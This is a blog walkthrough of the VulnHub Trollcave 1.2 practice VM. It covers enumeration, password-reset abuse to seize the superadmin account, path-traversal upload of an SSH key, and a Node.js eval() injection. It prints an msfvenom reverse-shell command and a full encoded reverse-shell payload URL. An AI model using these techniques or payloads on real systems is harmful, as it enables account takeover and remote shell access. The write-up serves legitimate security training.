---
layout: post
date: 2018-04-23 06:14:17 +0000  
title: "Don't Feed the Trolls"
category: Walkthrough
tags: [VulnHub, "Trollcave"]
comments: true
image:
  feature: troll.jpg
  credit: Tama66 / Pixabay
  creditlink: https://pixabay.com/en/fairy-tales-gnome-troll-1662427/
---

This post documents the complete walkthrough of Trollcave: 1.2, a boot2root [VM][1] created by [David Yates][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine which you know nothing about – no usernames, no passwords, just what you can see on the network. In this instance, you'll see a simple community blogging website with a bunch of users. From this initial point, you enumerate the machine's running services and general characteristics and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
 
Your first goal is to abuse the services on the machine to gain unauthorized shell access. Your ultimate goal is to read a text file in the `root` user's home directory (`/root/flag.txt`).

### Information Gathering
Let's kick this off with a `nmap` scan to establish the services available in the host:

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.128
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
80/tcp open  http    syn-ack ttl 64 nginx 1.10.3 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Trollcave
```

This is how the site looked like as rendered by the browser.

![screenshot-1](/assets/images/posts/trollcave-walkthrough/screenshot-1.png)

### Directory/File Enumeration

Let's find out more about the site with `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists).

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 -t 50 http://192.168.30.128/FUZZ
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.30.128/FUZZ
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000576:  C=200     67 L	     176 W	   1564 Ch	  "404"
000659:  C=200     66 L	     160 W	   1477 Ch	  "500"
000597:  C=200     67 L	     171 W	   1547 Ch	  "422"
001816:  C=302      0 L	       5 W	     93 Ch	  "admin"
004982:  C=302      0 L	       5 W	     93 Ch	  "comments"
007427:  C=200      0 L	       0 W	      0 Ch	  "favicon.ico"
009531:  C=302      0 L	       5 W	     93 Ch	  "inbox"
011054:  C=200     61 L	     141 W	   2165 Ch	  "login"
015172:  C=302      0 L	       5 W	     88 Ch	  "register"
015300:  C=302      0 L	       5 W	     93 Ch	  "reports"
015551:  C=200      5 L	      33 W	    202 Ch	  "robots.txt"
018846:  C=302      0 L	       5 W	     93 Ch	  "user_files"
018906:  C=302      0 L	       5 W	     93 Ch	  "users"
```

### Ruby on Rails

After navigating around the site for a bit, I noticed many [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs which led me to believe this site was built as a Ruby on Rails (RoR) web application.

```
# curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort
/assets/640px-Troll_Warning-7609c691efcf3b8040566ae6a4ccc54c44f3cc1cb028a0eb8eebef8259fca7a6.jpg
/assets/application-152e0b6420893f14eeb6f908ca26bc60cca1bf773cbe0cb0a493fe7541d77b7a.css
/assets/application-88d4cbee7b3f8591b7ccf003c3923c922b1e3fef8487fb1f09c4fc434c1bcb3d.js
/blogs/1
/blogs/2
/blogs/4
/blogs/6
/blogs/7
/login
/register
/register
/uploads/coderguy/ruby.png
/uploads/cooldude89/poochie.jpg
/uploads/dave/dave.png
/uploads/King/crown.png
/users/1
/users/12
/users/15
/users/16
/users/17
/users/2
/users/4
/users/5
/users/5
```

Digging further, the blog post at `/blogs/6` gave it away.

![screenshot-2](/assets/images/posts/trollcave-walkthrough/screenshot-2.png)

### Enumerating Users

I was able to enumerate the users of the site using nothing more than `curl` and a command-line JSON parser `jq`.

```
# curl -s 192.168.30.128/users/{1..20}.json | jq -raM

{
  "id": 1,
  "name": "King",
  "email": "king@trollcave.com",
  "password": null,
  "created_at": "2017-10-23T09:39:41.494Z",
  "updated_at": "2018-04-11T15:07:37.557Z"
}
...
{
  "id": 17,
  "name": "xer",
  "email": "xer@zmail.com",
  "password": null,
  "created_at": "2017-10-23T09:39:42.856Z",
  "updated_at": "2018-04-11T15:07:37.743Z"
}
```

### Enumerating Password Hashes

Using the same technique against `/reports`, I was able to enumerate four password digest or hash. 

```
# curl -s 192.168.30.128/reports/{1..20}.json | jq -jaM
{
  "id": 1,
  "content": "offensive comment, not even clever.",
  "user": {
    "id": 17,
    "name": "xer",
    "email": "xer@zmail.com",
    "password_hint": "fave pronoun",
    "password_digest": "$2a$10$FLjo5cedRTmoBjWowcC08.WmHpvltVEmmVoN8P5j6JQW/PzU3qmTq",
    "remember_digest": null,
    "role": 1,
    "hits": 6,
    "last_seen_at": null,
    "banned": null,
    "created_at": "2017-10-23T09:39:42.856Z",
    "updated_at": "2018-04-11T15:07:37.743Z",
    "avatar_id": null,
    "reset_digest": null,
    "reset_sent_at": null
  },
  "blog": {
    "id": 4,
    "title": "Politics & religion thread",
    "content": "\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out warns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t",
    "clearance": 0,
    "user_id": 5,
    "created_at": "2017-10-23T09:39:42.962Z",
    "updated_at": "2017-10-23T09:39:42.962Z"
  },
  "comment_id": 2,
  "created_at": "2017-10-23T09:39:42.998Z",
  "updated_at": "2017-10-23T09:39:42.998Z"
}
...
```

The passwords were hashed with `bcrypt` which was unfortunate because of the computational costs (10 rounds), cracking these hashes will be a futile exercise and a waste of CPU cycles. A more efficient way is needed.

### Password Reset

Recall the blog post above on `password_resets`? Turned out that the very well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) had a [chapter](https://www.railstutorial.org/book/password_reset) on it and provided a huge clue on how to proceed.

![screenshot-3](/assets/images/posts/trollcave-walkthrough/screenshot-3.png)

Using the URL `/password_resets/new`, I was able to navigate to the password reset page.

![screenshot-4](/assets/images/posts/trollcave-walkthrough/screenshot-4.png)

The initial attempt to reset King's password (**Superadmin**) failed because only normal members' passwords can be reset. Well, let's just reset the password of an ordinary member and see what happens.

Just as it was mentioned in the blog post, the mailer had an issue resulting in the password reset URL presenting itself like so.

![screenshot-5](/assets/images/posts/trollcave-walkthrough/screenshot-5.png)

Noticed the name of the user in the password reset URL? We could very well abuse it to reset the **Superadmin**'s password.

![screenshot-6](/assets/images/posts/trollcave-walkthrough/screenshot-6.png)

![screenshot-7](/assets/images/posts/trollcave-walkthrough/screenshot-7.png)

Boom! I'm the King (**Superadmin**) :crown:.

### File Mananger

The sight of **File manager** caught my attention immediately since that's a pretty common way of putting files under the attacker's control into the environment.

The first file that I tried to upload was just some random text to see if there's any kind of filtering in place.

![screenshot-8](/assets/images/posts/trollcave-walkthrough/screenshot-8.png)

The first obstacle I encountered was that file uploading is disabled. Well, I'm the **Superadmin** remember? I can simply go to the **Admin panel** to enable it.

![screenshot-9](/assets/images/posts/trollcave-walkthrough/screenshot-9.png)

Now that I can upload file, what kind of file should I upload? RoR is not PHP and there's no point in uploading Ruby files.

![screenshot-10](/assets/images/posts/trollcave-walkthrough/screenshot-10.png)

Let's see what happens when I upload a text file for a start.

![screenshot-11](/assets/images/posts/trollcave-walkthrough/screenshot-11.png)

Once the file is uploaded, we can view the file information simply by going to `/user_files/[file_number]` or `/user_files/[file_number].json` like this.

![screenshot-12](/assets/images/posts/trollcave-walkthrough/screenshot-12.png)

Now that we know the absolute path of where the file is uploaded to, we can start to explore how to exploit this. At the upload page, we saw that an alternative file name can also be provided. Could this be the ticket in?

When I gained access to **Superadmin** , more blog posts were unlocked and I saw one particular blog post and comment that could potentially be the key information to gaining access.

_User `rails` is present. Maybe SSH is possible?_

![screenshot-13](/assets/images/posts/trollcave-walkthrough/screenshot-13.png)

_File upload is vulnerable?_

![screenshot-14](/assets/images/posts/trollcave-walkthrough/screenshot-14.png)

Looking at the above information, perhaps we could make use of the file upload vulnerability to upload a SSH public key I control to `/home/rails/.ssh/authorized_keys`?

First, let's generate a SSH keypair (RSA) with `ssh-keygen`

```
# ssh-keygen -t rsa -b 2048
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): trollcave
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in trollcave.
Your public key has been saved in trollcave.pub.
The key fingerprint is:
SHA256:Xumzuy4PevNYxescbaB5fWicRBa5KtspSkTJaeeUM7E root@kali
The key's randomart image is:
+---[RSA 2048]----+
|          .   .. |
|       . o +  .. |
|        * E   o. |
|       o + = o.  |
|        S + +..  |
|       o o.+.B o |
|        + *++.O .|
|       o++o*o+ . |
|      ..oBB+o    |
+----[SHA256]-----+
```

Next, we upload `trollcave.pub` to `/home/rails/.ssh/authorized_keys` with a traversal technique.

![screenshot-15](/assets/images/posts/trollcave-walkthrough/screenshot-15.png)

Let's verify that the public key has indeed been uploaded.

![screenshot-16](/assets/images/posts/trollcave-walkthrough/screenshot-16.png)

### Low Privilege Shell

Let's see if we can SSH into the `rails` account.

![screenshot-17](/assets/images/posts/trollcave-walkthrough/screenshot-17.png)

Awesome!

### Node.js

During enumeration, I noticed a service was running at `tcp/8888`.

![screenshot-18](/assets/images/posts/trollcave-walkthrough/screenshot-18.png)

It turned out to be Node.js running some sort of calculator application for King.

![screenshot-20](/assets/images/posts/trollcave-walkthrough/screenshot-20.png)

If I've to guess, I'd say this is the way to gain `root` privileges because King is on the `sudoers` list.

![screenshot-19](/assets/images/posts/trollcave-walkthrough/screenshot-19.png)

It's interesting to note that this application is using `eval()` which further led me to believe this is our golden ticket.

![screenshot-21](/assets/images/posts/trollcave-walkthrough/screenshot-21.png)

According to [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)'s description of `eval()`,

>The argument of the `eval()` function is a string. If the string represents an expression, `eval()` evaluates the expression. If the argument represents one or more JavaScript statements, `eval()` evaluates the statements. Do not call `eval()` to evaluate an arithmetic expression; JavaScript evaluates arithmetic expressions automatically.

There is one small caveat though. Noticed `toString()` is appended to `eval()`? We just have to make sure a string is returned to whatever that was evaluated.

Fortunately, `msfvenom` is able to generate a Node.js reverse shell payload. 

```
# msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.30.128 LPORT=44444 -o rev.js
# echo '1+1;' >> rev.js  <-- this is to make sure toString() has something to do ;)
```

We also need to ensure that our payload is a string. To do that, we could encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.

The following Python code does that.

{% highlight python linenos %}
# cat encode.py
#!/usr/bin/env python

f = open('rev.js', 'r')
encoded = ''
for c in f.read():
    encoded = encoded + ',' + str(ord(c))
print 'eval(String.fromCharCode(%s))' % encoded[1:]
{% endhighlight %}

All that's left is to forward local port `tcp/9999` to remote port `tcp/8888` so that I can access it from my browser.

```
# ssh -L9999:localhost:8888 -i /root/keys/trollcave rails@192.168.30.130 -f -N
```

![screenshot-22](/assets/images/posts/trollcave-walkthrough/screenshot-22.png)

The final exploit URL goes like this.

```
http://localhost:9999/calc?sum=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,52,52,52,52,52,44,32,34,49,57,50,46,49,54,56,46,51,48,46,49,50,56,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59,10))`
```

On my `netcat` listener, this is what I got.

![screenshot-23](/assets/images/posts/trollcave-walkthrough/screenshot-23.png)

:dancer:

### Afterthought

This was an excellent opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js) both which I've heard many good things but never really got the chance to dig deeper until now.

I rate this exercise highly "fun and educational".

[1]: https://www.vulnhub.com/entry/trollcave-12,230/
[2]: https://twitter.com/@davidyat_es
[3]: https://www.vulnhub.com

*[JSON]: JavaScript Object Notation
